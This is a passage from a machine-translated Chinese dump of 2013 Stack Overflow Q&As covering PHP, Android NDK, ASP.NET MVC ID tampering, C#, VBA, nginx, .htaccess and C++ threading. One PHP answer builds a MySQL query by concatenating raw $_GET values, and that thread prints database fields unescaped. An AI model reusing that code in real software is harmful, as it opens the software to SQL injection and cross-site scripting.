                        echo "Sorry, but we can not find an entry to match your query<br><br>"; 
                    } 

    } 
```

然后在我的html表单下面我创建一个表并有

```
<?php
   //print the header
   foreach($colNames as $colName)
   {
      echo "<th>$colName</th>";
   }
?> 
```

和

```
<?php
   //print the rows
   foreach($test as $results)
   {
      echo "<tr>";
      foreach($colNames as $colName)
      {
         echo "<td>".$results[$colName]."</td>";
      }
      echo "</tr>";
   }
?> 
```

我不确定从哪里开始，但我会尝试使用复选框方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:14:43.917

好吧，有很多方法可以根据用户的喜好调整搜索。

只需要 php 和 html 的最基本解决方案是在要用作过滤器的单元格处设置复选框。

然后，您可以将新部分添加到旧的 mysql-command 与连接。例如，“名称”列的复选框，下一次搜索将仅显示具有选中名称的条目。

`<input type="checkbox" name="names[]" id="chWalter" value="Walter" /> <label for="chWalter">chWalter</label>`

发布后，您可以使用循环遍历复选框数组并添加类似

`" and name like '".$_GET['names'][$i]."'"`.

请注意，使用带有复选框的组将为您提供一个包含所有已激活元素值的数组。

当然，您可以修改选中的复选框如何更改先前的请求...对于删除过滤器，您可以在请求字符串上使用正则表达式。

更好的解决方案是使用 javascript。例如，您可以使用通过单击表格单元格来检查的隐藏复选框。

或者你可以只使用 javascript 来过滤元素！使用类和

`document.getElementsByClassName['class']`

将减轻您的服务器流量并加快请求速度。为此，我建议为每一行（row1、row2 等）使用一个类，为每一列（name、id 等）使用一个类。然后当单击一个字段时，获取同一列类的所有元素并循环它们。

如果他们的内容不匹配，请检查他们的行类并设置一个像“display：none”这样的css-attribtue ...如果你使用表格布局，你可以用类似的东西替换行类的使用

```
this.parentNode.style.display="none" 
```

禁用行（`<tr>`-tag）。

否则，您再次删除 css 以显示它们。

这样做的缺点是，缩减的结果只显示给用户，但是为了在服务器站点上再次使用缩减的版本，您需要再次将结果映射到复选框或隐藏字段并再次发送。

# android-ndk - Android NDK - 链接问题

> ID：16215220
> 
> 赞同：0
> 
> 时间：2013-04-25T12:49:48.853
> 
> 标签：android-ndk, cygwin, native

那是我第一次使用 android NDK 和 Cygwin，如果有帮助的话，我正在使用 Windows XP 32 位。

我正在尝试移植在 Windows 和 Linux 上使用的 Visual Studio 8 项目以在 android 平台上使用它。该项目相当大，其文件位于多个文件夹中……</p>

尝试使用 ndk-build 构建它时，我收到很多此类错误：

> D:/android-ndk-r8d-windows/android-ndk-r8d/toolchains/arm-linux-androideabi-4.6/prebuilt/windows/bin/../lib/gcc/arm-linux-androideabi/4.6/.. /../../../arm-linux-androideabi/bin/ld.exe: ./obj/local/armeabi-v7a/objs/ndkmain/.o: 在函数版本:jni/.cpp:75:错误：未定义对 'get_version(long*, long*, long*, long*)' 的引用

对于这个例子，这里是我的 MyFile.cpp

```
#include "../KERNEL/Include/Get_Version.h"

long Version (long *a,
            long *b,
            long *c,
            long *d)
{
    if(get_version(a, b, c, d) == -1)
        return(IDP_ERR_POINTER);

  return (IDP_CORRECT);
} 
```

**get_version(long*, long*, long*, long*)**在Get_Version.h头中定义好，找到Get_Version.h头

Get_Version.h：

```
#ifndef GET_VERSION_H_
#define GET_VERSION_H_

int get_version(long *a, long *b, long *c, long *d);

#endif //#define GET_VERSION_H_ 
```

Get_Version.cpp：

```
#include <stdlib.h>
#include "../Include/Get_Version.h"

int get_version(long *a, long *b, long *c, long *d)
{

    if (a == NULL){ return -1;}
    if (b == NULL){ return -1;}
    if (c == NULL){ return -1;}
    if (d == NULL){ return -1;}

    *a = 3;
    *b = 1;
    *c = 8;
    *d = 2;

  return (0);
} 
```

如果不是链接标题，而是使用**#include "../KERNEL/Source/Get_Version.cpp"**链接源文件，则错误消失，但我想避免这种情况，因为这将是不好的做法......

我的猜测是编译器无法将 Get_Version.cpp 中的函数定义链接到 Get_Version.h 中的声明，但我不知道如何通过 android ndk 和 cygwin 强制此链接...

谢谢你的帮助。

PS：这是我的 .mk 文件

安卓.mk

```
LOCAL_PATH:=$(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE:=ndkmain
LOCAL_SRC_FILES :=<MyFolder>/<MyFile>.cpp
include $(BUILD_SHARED_LIBRARY) 
```

应用程序.mk

```
APP_STL :=stlport_shared
APP_ABI:= armeabi-v7a 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T12:54:04.937

你需要：

`LOCAL_SRC_FILES :=<MyFolder>/<MyFile>.cpp <MyFolder>/Path/To/Get_Version.cpp`

# asp.net-mvc - 从视图回发时保护实体 ID 的最有效方法

> ID：16215225
> 
> 赞同：1
> 
> 时间：2013-04-25T12:50:06.313
> 
> 标签：asp.net-mvc, viewmodel, code-injection

**编辑**- 只是一个快速的编辑，从一个明确的问题开始！我实质上要问的是，从视图发回时保护我的实体标识符的最有效方法是什么？

我一直在考虑在编辑视图模型时保护 POST 上的 ID 的方法。让我们以一个示例实体为例

```
public class Post
{
    public int Id { get; set; }
    public string Title { get; set; }
    public string Content { get; set; }
} 
```

及其对应的视图模型：

```
public class PostViewModel
{
    public int Id { get; set; }
    public string Title { get; set; }
    public string Content { get; set; }
} 
```

现在，当我将此视图模型传递给允许用户编辑它的视图时，我将执行以下操作：

```
public ActionResult EditPost(PostViewModel viewModel)
{
    Post post = database.Posts.Single(p => p.Id.Equals(viewModel.Id));
    post.Title = viewModel.Title;
    post.Content = viewModel.Content;
    database.Entry(post).State = System.Data.EntityState.Modified;
    database.SaveChanges();

    return View(viewModel);
} 
```

或者也许通过参数列表传递 ID，如下所示：

```
public ActionResult EditPost(int postId, PostViewModel viewModel)
{
    Post post = database.Posts.Single(p => p.Id.Equals(postId));
    // and the rest
} 
```

无论哪种方式，我们都需要返回我们正在更新的实体的标识符以及 POST 数据。我们如何确保更新的实体是预期的？

我想我们可以验证用户是否有足够的访问权限来更新这个实体......但是如果用户的帐户被盗用，并且一些随机*黑客*开始使用他们的帐户注入随机 ID 怎么办？随机更新各种`Post`s。

可能建议实体使用复杂的（如 GUID）标识符，这会使*猜测*变得更加困难，但这会使您的漂亮友好的 URL 看起来对普通用户来说有点吓人，在查看`Post`for时不得不传递它例子。

我们如何在这里两全其美？保持干净的 URL，但保护我们的实体免受注入攻击？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:48:03.903

这是直接引用攻击，根据 oswap 的建议，您可以

*   通过将 id 交换为 guid 来混淆 id，然后将映射保存在内存/会话中
*   在会话中保留对项目的引用并确保它与返回的相同

我解决这个问题的方法是使用属性，我手头没有任何代码，所以你需要类似的东西

```
Decorate get action with attribute
on gets, attribute clears item list from session
Pull Item from db
store items id in session for item

decorate post action with attribute    
attribute makes sure modelstate is valid first (saves double validating)
attribute looks in session for id
attribute checks the id against the stored value
if id matches, action can continue
if id doesn't match, an entry is made in modelstate 
```

使用这种方法，您可以保护自己免受有人在 burpsuite 等工具中摆弄您的 id 或使用浏览器的控制台模式来翻转隐藏字段。

此外，作为此过程的开始，始终确保您的获取项目不会盲目地从数据库中获取，而是首先确保该人实际上可以获取该项目，即。属于他们的数据集等

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T16:06:14.423

您是在谈论阻止某人在他们应该编辑记录 1 时入侵他们的表单以说他们正在更新记录 2，对吗？并且不一定阻止人们发现用户 ABC 的帖子的身份为 1？

也许使用标识列*和*guid 创建表和视图模型会更简单一些。您的所有 urls / GET 过程都可以使用身份构建，并且您可以使用 guid 进行所有 POST 处理。这将使您不必构建一些内存映射、使用会话键、创建操作过滤器等​​。我和您一样 - 我想减少您对会话的依赖量，因为它是时间敏感的；一旦你的会话过期，你保存在内存中的映射就会过期，所以它总是会返回一个假阴性。

不过，这可能会消除数据层中的一些可重用性。

编辑：但我认为最好的保护就像你说的那样 - 验证编辑记录的帐户有权编辑记录。如果将其与 guid（或表单上加密的内容）结合使用，将很难随机猜测记录。

您还可以尝试在 POST 表单中添加某种散列算法。例如，对身份、创建帖子的用户、创建帖子的时间以及最终用户看不到的实体上的一些随机不可更新的盐进行哈希处理。您还可能包含一些随机的内容（例如呈现页面时的刻度时间），以确保每次页面加载时哈希都是唯一的，这将防止有人耕种 guid / 哈希（您需要将刻度张贴在单独的字段）如果帐户被盗用。您的验证过程会将 POST 的哈希与实体上相同字段的哈希匹配，并且仅在哈希匹配时执行更新。但这对我来说似乎有点矫枉过正。

# c# - C#在泛型方法中返回字典

> ID：16215226
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:08.797
> 
> 标签：c#, generics, dictionary, return, return-value

```
public abstract BaseClass
 {
    public abstract Dictionary<T, V> ExtractSummaryInfo<T, V>()
        where V : Product;    
 }

public MyClass : BaseClass
 {
   public override Dictionary<T, V> ExtractSummaryInfo<T, V>()
      {
        Dictionary<T, V> products = new Dictionary<T, V>();

        string id = "HRM";
        Product product = new Product("Product 1");

        products[id as T] = product as V;

        return products;
       }
  } 
```

在我看来，这行代码（products[id as T] = product as V;）是错误的，请告诉我如何实现这个方法？

# c# - 如何使用集合类中的方法对列表进行排序

> ID：16215228
> 
> 赞同：1
> 
> 时间：2013-04-25T12:50:11.683
> 
> 标签：c#

我的搜索方法有问题。我想在我的集合类中创建一个函数，它可以在我的列表中找到具有特定名称的所有产品（对象），然后按价格对列表进行排序。

但是因为它是通用的，所以我无法“访问”列表中对象中的字段。有人能帮帮我吗？

这是我尝试过的：

```
public class ProductList<T> : ICollection<T>, IComparer<T>
{
    public List<T> _productList = new List<T>();

    // Some other methods

    // 1\. try:
    public void FuncSearch_Name(string search_name, ProductList<Product> ListIn, out ProductList<Product> ListOut)
    {
        ListOut = ListIn.Where(x => x.Name.Equals(search_name)).ToList(); // Here it is complaining about that it cant not implicity convert a generic list to productlist (I dont really understand that)
    }

    // I have also tried like this:
    public void FuncSearch_name(string search_name, ref List<T> ListIn, out List<T> ListOut)
    {
        ListOut = ListIn.Where(x => x.Name.Equals(search_name)).ToList();
        ListOut.OrderByDescending(o => o.Price).ToList(); // Here it can't find Name and Price because "T" not contains them..
    }
} 
```

感谢您的时间。我希望你能理解我的问题并能帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T14:01:30.880

为什么不将 ProductList 限制`T`为接口（或具体产品）？

```
public class ProductList : ICollection<IProduct>, IComparer<IProduct> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:01:59.150

好吧，您可以为以下添加额外的约束`T`：

```
interface IHasName
{
   string Name{get;}
} 
```

因此，编译器会知道如何从 T 中获取名称。但是，您只能为您的类执行此操作。对于不受您控制的类，您可以编写一个实现此接口的包装器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T14:00:28.607

好吧，实际上您正在实施`IComparer<T>`. 这是您用来对`T`对象进行排序的比较器吗？如果是，您可以将它用于 a `List.Sort`，它是*就地*的，不像`OrderByDescending`：

```
public void FuncSearch_name(string search_name, ref List<T> ListIn, out List<T> ListOut)
{
    ListOut = ListIn.Where(x => x.Name.Equals(search_name)).ToList();
    ListOut.Sort(this);
} 
```

这直接`Sort`排序`ListOut`，而`OrderByDescending`返回一个新的`IOrderedEnumerable`并且*不会改变* `ListOut`自身。

但是，我认为可能有一个更简单的方法：

```
public IEnumerable<Product> FindByName(string name)
{
    myProducts.Where(p => p.Name == name).OrderByDescending(p => p.Price);
} 
```

您可以在不实现自己的集合类和`IComparer<T>`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T14:01:00.417

由于您的类是泛型的，并且泛型参数不受限制，`T`可以是*任何东西*，因此编译器无法知道您的对象具有`Name`属性。

看起来您的声明应该是：

```
public class ProductList<T> : ICollection<T>, IComparer<T> where T: Product
{
    public List<T> _productList = new List<T>(); 
```

如果 Product 有子类，或者只是

```
public class ProductList : ICollection<Product>, IComparer<Product> 
{
    public List<Product> _productList = new List<Product>(); 
```

实现一个类型的集合也是不*寻常*`IComparer`的。通常这是在一个单独的类中完成的。

仔细查看您的问题，`ToList<Product>`返回一个`List<Product>`. 无法将 a`List<Product>`转换为您的自定义类。由于您没有发布构造函数，我可以看到您可以创建一个新的唯一方法`ProductList`是逐个添加项目。通常，一个集合类型有一个构造函数，它接受一个集合（通常是一个简单的`IEnumerable`）来初始化它。

无论哪种方式，您的集合类型似乎都做了很多事情，而您尝试实现的方法却没有；根本不与类成员交互。

# c# - 从用户控件调用父页面的方法

> ID：16215229
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:13.397
> 
> 标签：c#, windows-runtime, microsoft-metro

我有一个显示为弹出窗口的用户控件。当用户关闭此用户控件时，我需要从其父页面调用一个方法。我怎样才能做到这一点？

我尝试在弹出的“卸载”事件中调用它，但我无法从控件访问父页面的方法......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:53:53.273

您可以将当前使用的父页面实例传递到弹出窗口中。这样，您可以访问父页面具有的公共方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T14:36:30.897

在我看来你应该使用一个事件，不是吗？在父窗口中添加事件处理程序。使用用户控件中的预定义事件（例如 Closed）或在用户控件中编写您自己的事件：

```
parentWindowMethod()
{
  MyUserControl myUserControl = new MyUserControl();
  myUserControl.event += this.userControlDismisseed;
  ...
}

userControlDismissed(...)
{
  ...
} 
```

# c# - 如何设置表单背景？

> ID：16215230
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:15.580
> 
> 标签：c#, visual-studio, windows-mobile, windows-ce, smart-device

我正在为 Honeywell Dolphin 6100 开发一个应用程序，这是一款带有条形码扫描仪的移动计算机，它使用类似 Windows CE 5.0 的操作系统。

我想将表单的背景设置为图像。我找不到像“form.BackgroundImage”这样的东西。另外，如果可能的话，我想让一个图片框透明，以便在其他控制器后面。

对这个问题有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T14:42:16.397

您可以使用停靠在表单中的图片框，也可以覆盖 OnPaint 事件处理程序并使用 DrawImage。如果表单上有其他元素，请确保使用正确的 z 顺序。不要在这些元素之上绘制。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-25T12:52:19.490

您应该能够将其设置为：

```
form.BackgroundImage = image; 
```

你确定这不起作用吗？

你也可以看看[这个](http://msdn.microsoft.com/en-us/library/ms172529%28v=vs.90%29.aspx?cs-save-lang=1&cs-lang=csharp#code-snippet-1)。

# excel - vba：更改下拉列表的事件代码丢失

> ID：16215234
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:25.213
> 
> 标签：excel, vba

我的 excel 表中有一个下拉框。在某些时候，vba 为下拉列表分配了一个事件代码，我将其删除。

现在我不能使用这个下拉菜单，因为每次更改值都会抱怨无法执行已删除的代码。

如果我想查看它的代码 assigen 会抛出错误“无效引用”。

如何删除此事件代码？

编辑如果我添加请求的功能，整个错误就会消失

```
Public Sub Dropdown4_BeiÄnderung()
' must exist
End Sub 
```

但实际上我希望能够删除它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T12:56:13.103

如果你知道`name`这个组合框的形状，你可以在 VBA 中这样做：

```
Sub Dropdown4NoMacro()
Dim shpName as String
shpName = "Drop Down 4" '## Modify as needed.'

ActiveSheet.Shapes(shpName).OnAction = vbNullString
End Sub 
```

**不使用 VBA 进行**编辑：****

 **您应该能够右键单击控件，然后选择`Assign Macro`，您将在其中看到它`Dropdown4_BeiÄnderung`（或`ThisWorkbookName!Dropdown4_BeiÄnderung`）。

只需删除该字段使其为空，然后按`OK`。看截图，在按下之前突出显示的字段应该是空的`OK`。

![分配宏对话框的屏幕截图](https://i.stack.imgur.com/1RG0W.jpg)

**原始答案**（假设这与`Worksheet_change`事件有关。

尝试按 ALt+F11 以调出 Visual Basic 编辑器。在左侧，您应该看到一个`Objects`包含工作簿和几个工作表的列表。右键单击相应的工作表以查看该工作表中的代码。

然后，删除与该`Worksheet_Change`事件关联的所有代码——或者，在此处发布代码，以便我们告诉您是否有您可能想要保留的任何部分，同时*仅*删除影响下拉控件的部分。**

# c# - 在 C# 构建中找不到 svn.exe

> ID：16215235
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:32.687
> 
> 标签：c#, visual-studio-2010, tortoisesvn

因此，我使用 Tortoise（最新版本）在 svn 中检查了一个项目，每当我构建它时，我都会收到消息“找不到 svn.exe！请确保它已安装在您的路径中”。我不知道发生了什么，因为我检查过的其他项目没有这样做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:53:08.053

您的构建可能在自定义构建步骤的某处使用命令行 SVN 客户端。

删除它或安装命令行客户端。

# entity-framework - SQL Compact 4 Entity Framowrk 3.5 升级 .sdf 文件

> ID：16215236
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:35.190
> 
> 标签：entity-framework, sql-server-ce, upgrade

我有`Windows Forms`应用程序。我将它部署在客户的机器上。他在他的机器上本地使用这个应用程序。我需要升级`database`。如何在不丢失客户数据的情况下做到这一点？

我使用`SQL Server` `Compact Edition 4.0`和`Entity Framework 3.5`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:18:59.890

使用所需的 ALTER 和 INSERT/UPDATE/DELETE 语句创建脚本，并针对客户数据库逐一执行语句（并可能在表中指示数据库已升级，以便仅运行一次此过程）

# javascript - 显示日期独立于系统区域设置和应用程序语言

> ID：16215237
> 
> 赞同：1
> 
> 时间：2013-04-25T12:50:39.497
> 
> 标签：javascript, datetime, locale

我的 Web 应用程序支持两种语言：英语和法语，其中日期显示在每个页面的标题中。

现在，根据用户系统的区域设置显示日期。如果最终用户系统区域设置是斯洛伐克，则日期显示为斯洛伐克。如果是英文，则显示为英文。无论 Web 应用程序以哪种语言运行英语或法语。这是因为我正在使用

```
dateString.toLocaleString() 
```

下面是代码：

```
var reg = new RegExp("[,]+", "g");
var tableau = theDate.split(reg);               
var value = new Date(tableau[0], (parseInt(tableau[1], 10) - 1), tableau[2], tableau[3], tableau[4], tableau[5]);
return value.toLocaleString(); 
```

其中 theDate 是逗号分隔的字符串，包含月、日、年、时间（如`10.21,2012,51,50,32`）

现在，我担心的是我想以我的应用程序运行的格式显示日期。如果它以法语运行，则应以法语显示，如果以英语运行，则应以英语显示。独立于用户系统的语言环境。

当前日期格式为（英语语言环境）：`Thursday, April 25, 2013 5:28:59 PM` 对于其他语言环境，日期和月份将相应转换。

如果我使用`value.toString()`，那么它会以这种格式显示

`Thu Apr 25 2013 17:28:59 GMT+0530 (India Standard Time)`

我不想要。我想以当前格式显示，但要根据应用程序语言（en/fr）。

请提供宝贵的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:13:54.963

几小时前我在这里给出的答案几乎相同：[JavaScript - 获取系统短日期格式](https://stackoverflow.com/questions/16210058/javascript-get-system-short-date-format)
没有完美的解决方案，但由于您想要您声明的修复格式，我建议您使用`toISOString()`它是否适合您的需要，或者`getUTCDate()`, `getUTCMonth()`和`getUTCDay()`并将这些家伙连接到您选择的字符串中。

# c# - 如何确定类型数组中的继承类？

> ID：16215238
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:50:43.080
> 
> 标签：c#

假设我有这些课程：

```
Class Animal;

Class Tiger: Animal;
Class Bear: Animal;
Class Giraffe: Animal; 
```

而这个数组：

```
Animal[] p = [new Tiger(), new Bear(), now Giraffe()] 
```

我如何确定：

```
(p[0] is Tiger) 
```

我收到一条消息说 p[0] 始终是动物，而不是老虎

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:52:35.067

你可以[`Enumerable.OfType<TResult> Method`](http://msdn.microsoft.com/en-us/library/bb360913.aspx)像这样使用：

```
var tigersInArray = p.OfType<Tiger>(); 
```

`Tiger`以上将从数组中返回您（s）。

您的检查`(p[0] is Tiger)`应该有效，确保您`0`在阵列中的位置上有老虎。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T12:55:56.387

这是动物*和*老虎，因为老虎是动物。一旦将 Tiger 放入数组中，您就会丢失有关特定类型的信息，但对象本身仍然知道。

您仍然可以找出它的类型并将其转换回：

```
if (p[0] is Tiger)
    Tiger tiger = (Tiger)p[0]; 
```

或者

```
Tiger tiger = p[0] as Tiger;
if (tiger != null)
    ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T13:00:45.210

你试过这个吗？

```
p[0].GetType() == typeof(Tiger) 
```

# php - 如何使用 htaccess 保护 Php 文件以防止外部使用或直接使用

> ID：16215242
> 
> 赞同：0
> 
> 时间：2013-04-25T12:50:54.487
> 
> 标签：php, .htaccess

例如，如果有人尝试使用我的 php 脚本或外部使用或直接使用，我想拒绝他。
我在我的 htaccess 中试过这个：

```
RewriteCond %{HTTP_REFERER} !^$
RewriteCond %{HTTP_REFERER} !^http://(www\.)?mydomain.com(/)?.*$ [NC]
RewriteRule \.(php)$ / [NC,R,L] 
```

但它似乎不起作用，我想要的是仅当我在服务器上的另一个页面中调用 php 脚本时才允许它。
拒绝/允许方式也不完美，因为可以通过`CURL`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T22:05:11.757

你可以尝试这样的事情：

```
RewriteCond %{REMOTE_ADDR} !^127\.0\.0\.1$
RewriteRule \.(php)$ / [NC,R,L] 
```

或者没有 mod_rewrite：

```
Order deny,allow
Deny from all
Allow from 127.0.0.1 
```

# nginx - Nginx 与 default_server 和一个 ipaddress 上的多个域

> ID：16215243
> 
> 赞同：3
> 
> 时间：2013-04-25T12:50:55.560
> 
> 标签：nginx

我刚刚安装了 nginx 并为 test.example.com 创建了一个新配置。哪个有效。

但 example.org 也指向我的服务器。现在，如果我转到 example.org，nginx 会将我重定向到 test.example.com。

我读到您需要创建一个默认服务器条目，例如返回 444；这就是我所做的。这是我对该站点的配置：

```
server {
    listen       IP:80;
    server_name test.example.com;
    server_tokens off;
    root /nowhere;
    rewrite ^ https://test.example.com$request_uri permanent;
}
server {
    listen IP:443;
    server_name test.example.com;
    server_tokens off;
    root [...];

[...]
} 
```

我之前在 nginx.conf 中添加的默认服务器条目（也在之后尝试过）“include /etc/nginx/sites-enabled/*;”

```
server {
    # use default instead for nginx 0.7.x, default_server for 0.8.x+
    listen IP:80 default_server;      

    server_name _;
    return 444;
} 
```

对我来说，这看起来是正确的。但我仍然从 example.org 重定向到 test.example.com。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:42:41.007

您根本不应该在默认设置中设置 server_name 。它确实需要在 nginx 配置中的实际服务器块之前。

444 也是一个奇怪的返回错误。您应该只返回一个 404 来指示未找到服务器，而不是自定义 Nginx 错误代码。

**编辑**

至于 SSL 不起作用，您似乎没有在配置文件中实际设置 SSL 证书或打开 ssl。

```
server {
    listen 443 default_server ssl;
    ssl_certificate      /usr/local/nginx/conf/cert.pem;
    ssl_certificate_key  /usr/local/nginx/conf/cert.key;  

    server_name test.example.com;
    server_tokens off;
    root [...];
} 
```

# vb.net - 以角度绘制线条 vb.net

> ID：16215247
> 
> 赞同：1
> 
> 时间：2013-04-25T12:51:06.337
> 
> 标签：vb.net, draw, angle

我可以在网上找到很多关于如何在 vb.net 中画线的例子。

但是，我找不到任何有关如何以特定角度绘制线条的示例。

有人可以告诉我该怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T15:27:31.930

您需要使用`sin`/进行一些数学运算`cos`。

`x1`, `y1`= 线的起始位置
`angleInRadians`= 转换为弧度的线的角度

```
x2 = lineLength * Math.Cos(angleInRadians) + x1
y2 = lineLength * Math.Sin(angleInRadians) + y1 
```

然后你可以画一条从 ( `x1`, `y1`) 到 ( `x2`, `y2`) 的线。

# java - 带有 ActionBar Sherlock Tab 片段的类生命周期

> ID：16215248
> 
> 赞同：0
> 
> 时间：2013-04-25T12:51:12.020
> 
> 标签：java, android, actionbarsherlock

我正在开发我的第一个 Android 应用程序，并且对如何安排控制器/类生命周期的理解感到困惑。我来自 iOS 背景。

基本上我所做的就是遵循这个[简单的教程](http://blog.eilfa.com/actionbarsherlock-with-fragments/)

因此，据我了解，我将 TabListener 绑定到片段。当切换选项卡时，TabListener`onTabSelected()`被调用，并且每次创建 FragmentA/Fragment B 的新实例。

这导致每次我切换选项卡时都会`onCreate..()`再次调用所有方法。

我不想每次切换选项卡时都创建一个新的片段实例，而是使用在应用程序启动时最初创建的片段实例。

问题是如何在不杀死其中的片段的情况下切换选项卡？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-14T17:40:34.410

您可以通过附加/分离片段来实现此目的，每次未选择选项卡时在选项卡侦听器上分离当前片段并在 onTabSelected 方法上检查您之前是否创建过片段。

```
private Fragment       mFragment;
private final String   mTag;
private final Class<T> mClass;

public TabListener(String pTag, Class<T> pClass) {
    mTag = pTag;
    mClass = pClass;
}

@Override
public void onTabSelected(Tab tab, FragmentTransaction ft) {
    if ( mFragment == null ) {
        try {
            mFragment = (Fragment)mClass.newInstance();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        ft.add(R.id.fragment_container,mFragment,mTag);
    } else {
        ft.attach(mFragment);
    }   
}

@Override
public void onTabUnselected(Tab tab, FragmentTransaction ft) {

    if ( mFragment != null ) {
        ft.detach(mFragment);
    }
}

   public void onTabReselected(Tab tab, FragmentTransaction ft) {
    //Nothing   
   } 
```

然后你可以实例化你的听众，如

```
TabListener l = new TabListener<MyFragment>(tabTag, MyFragment.class) 
```

# c++ - 基本 C++ 多线程

> ID：16215262
> 
> 赞同：0
> 
> 时间：2013-04-25T12:52:06.950
> 
> 标签：c++, multithreading

我正处于开发的设计阶段，正在考虑在 C++ 中使用多线程来实现一些功能。我熟悉多线程的基础知识，但想让其他人接受我的想法。我还没有选择多线程库（倾向于 Boost），但我的问题可能与选择的库无关。

基本上我会有一个类（我们称之为CommandGenerator）在一个while循环中执行（直到终止）并检查由另一个软件填充的命令消息队列。每次 CommandGenerator 从队列中获取消息时，我希望它生成一个在后台执行并处理刚从队列中取出的数据的线程。同时，我希望 CommandGenerator 继续运行并再次绕过 while 循环并提取任何新消息并再次产生更多线程。这在概念上可能吗？我可以继续生成线程并让它们在后台运行直到它们完成，而代码继续循环并检查队列？CommandGenerator 不需要控制线程。

任何输入表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:57:26.727

您想要做的就是所谓的“生产者-消费者”模式。

我强烈建议不要为收到的每条消息创建一个新线程：如果你这样做并且一次收到太多消息，你可能会堵塞机器。

相反，拥有固定数量的消费者线程来读取消息队列，并让它们一次处理一条消息。如果一次有太多消息，它们将被存储在队列中，等待处理。

由于在获取消息和实际处理消息之间存在延迟，恕我直言，解决方案再次不是为每条消息生成一个线程，而只是增加消费者线程的数量。通过这种方式，您可以控制资源使用。您需要多少线程完全取决于您的应用程序，您必须自己找出答案。

至于实现，如果你使用 C++11，你只需要 std::thread / std::mutex 和 std::condition_variable。如果您使用 C++03，则 boost 具有等效的类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:11:44.830

您的概念是可行的，并且非常接近一些常规的多线程模式。一种模式是使用共享线程安全队列。您有一个生产者，在这种情况下，您`CommandGenerator`将工作推到队列中。然后，您将拥有等待将某些内容放入队列的消费者线程。当一个项目被推入队列时，一个（并且只有一个）线程能够取出该项目并对其进行处理。

实现这一点的一种方法是使用`std::thread`and `std::mutex`。

根据您使用的编译器，您应该认真查看[std::async](http://en.cppreference.com/w/cpp/thread/async)。这可以消除需要知道将创建哪些线程以及何时创建的负担。

您需要确保知道需要停止处理时会发生什么。例如，当您`CommandGenerator`停止时，是否应该等待处理线程停止？命令处理线程如何停止？仍在队列中的项目会发生什么？这些是您需要考虑的设计决策（如果您还没有考虑的话）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T12:55:16.973

是的，你的概念是相当可行的。然而，名义上你对可以产生多少线程有一个上限。界限可能很大。

# php - 将格式化的 HTML 代码从 SQL 数据库传递到 HTML 页面

> ID：16215267
> 
> 赞同：-1
> 
> 时间：2013-04-25T12:52:19.433
> 
> 标签：php, html, sql

我有一个 SQL 数据库，它使用此方法将数据传递到 HTML 页面[链接这里](https://developers.google.com/maps/articles/phpsqlajax_v3?hl=ja)：

```
downloadUrl("phpsqlajax_genxml.php", function(data) {
  var xml = data.responseXML;
  var markers = xml.documentElement.getElementsByTagName("marker");
  for (var i = 0; i < markers.length; i++) {
    var name = markers[i].getAttribute("name");
    var address = markers[i].getAttribute("address");
    var type = markers[i].getAttribute("type");
    var point = new google.maps.LatLng(
        parseFloat(markers[i].getAttribute("lat")),
        parseFloat(markers[i].getAttribute("lng")));
    var html = "<b>" + name + "</b> <br/>" + address;
    var icon = customIcons[type] || {};
    var marker = new google.maps.Marker({
      map: map,
      position: point,
      icon: icon.icon,
      shadow: icon.shadow
    });
    bindInfoWindow(marker, map, infoWindow, html);
  }`enter code here`
}); 
```

在这部分编辑 HTML 很好，但如果我将格式化的 HTML 例如`<b> Hello World </b>`作为变量传递给它，它将显示为“ `<b> Hello World </b>`”，因此不会被视为 HTML 代码。

我想这样做，以便可以将预格式化的 HTML 传递给 InfoWindow。

他们有办法解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-28T11:22:05.927

我解决了这个问题，而不是在 PHP 文件中使用以下内容来创建 XML：

```
// Iterate through the rows, printing XML nodes for each
while ($row = @mysql_fetch_assoc($result)){
  // ADD TO XML DOCUMENT NODE
  echo '<marker ';
  echo 'name="' . parseToXML($row['name']) . '" ';
  echo 'address="' . parseToXML($row['address']) . '" ';
  echo 'lat="' . $row['lat'] . '" ';
  echo 'lng="' . $row['lng'] . '" ';
  echo 'type="' . $row['type'] . '" ';
  echo '/>';
} 
```

我使用了 DOM XML 函数：

```
// Iterate through the rows, adding XML nodes for each
